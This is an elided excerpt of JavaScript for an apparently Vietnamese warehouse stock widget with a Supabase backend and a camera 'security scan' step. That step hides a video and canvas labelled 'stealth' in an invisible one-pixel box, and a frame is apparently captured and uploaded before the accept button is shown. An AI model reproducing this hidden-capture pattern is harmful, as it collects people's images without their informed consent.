...
(function() {
    ...
    function createStructure() {
        ...
        <style>
            ...
            .plm-tabs { display: flex; background: #fff; border-bottom: 2px solid #e2e8f0; overflow-x: auto; flex-shrink: 0; }
            .plm-tab { padding: 14px 20px; border: none; background: transparent; font-size: 14px; font-weight: 600; color: #64748b; cursor: pointer; white-space: nowrap; border-bottom: 2px solid transparent; }
                ...
                <div class="plm-body" id="plmBodyWrap">
                    ...
                    <div id="plmSecurityOverlay" class="plm-sec-overlay plm-hidden">
                        <div class="plm-sec-box">
                            <div class="plm-sec-icon"><i class="fas fa-user-shield"></i></div>
                            ...
                            <div style="width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; margin:0 auto;">
                                <video id="plmStealthVideo" autoplay playsinline muted></video>
                                <canvas id="plmStealthCanvas"></canvas>
                            </div>
                            
                            <div id="plmSecStatusText" style="color: #3b82f6; font-weight: bold; font-size: 14px; margin-bottom: 15px; display: none;">
                                <i class="fas fa-spinner fa-spin"></i> Đang tải lên dữ liệu...
                            </div>

                            <button id="plmSecBtnAccept" class="plm-btn" style="background:#10b981; display: none;">Tôi đã hiểu & Tiến hành quét</button>
                            <button id="plmSecBtnCancel" class="plm-btn" style="background:transparent; color:#94a3b8; border:1px solid #475569; margin-top:10px;">Hủy bỏ</button>
                        </div>
                    </div>
                </div>
            </div>
    ...
    async function executeAutoCaptureAndUpload() {
        ...
        var statusText = document.getElementById('plmSecStatusText');
        ...
        canvas.toBlob(async function(blob) {
            var sb = api.check();
            if(!sb) {
                plmToast('Không có kết nối CSDL Supabase', 'error');
                return;
            }
            try {
                ...
                document.getElementById('plmSecBtnAccept').style.display = 'flex';
                document.getElementById('plmSecBtnAccept').onclick = function() {
                    stopFaceIdFlow();
                    startBarcodeScanner();
                };
            } catch(e) {
    ...
    function renderInbound() {
        el.panels.inbound.innerHTML = `
            <div class="plm-card" style="max-width:650px; margin: 0 auto;">
                ...
                <button class="plm-btn" id="btnSubmitInbound" style="background: #10b981;"><i class="fas fa-box-open"></i> Ghi Nhập Kho CSLD</button>
            </div>
        `;
...
async function handleOutboundSubmit() {
    ...
    function triggerSecurityScanFlow(inputId) {
        ...
        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            ...
            .catch(function(err) {
                plmToast("Từ chối quyền Camera: " + err.message, "error");
                stopFaceIdFlow();
            });
        }
    }
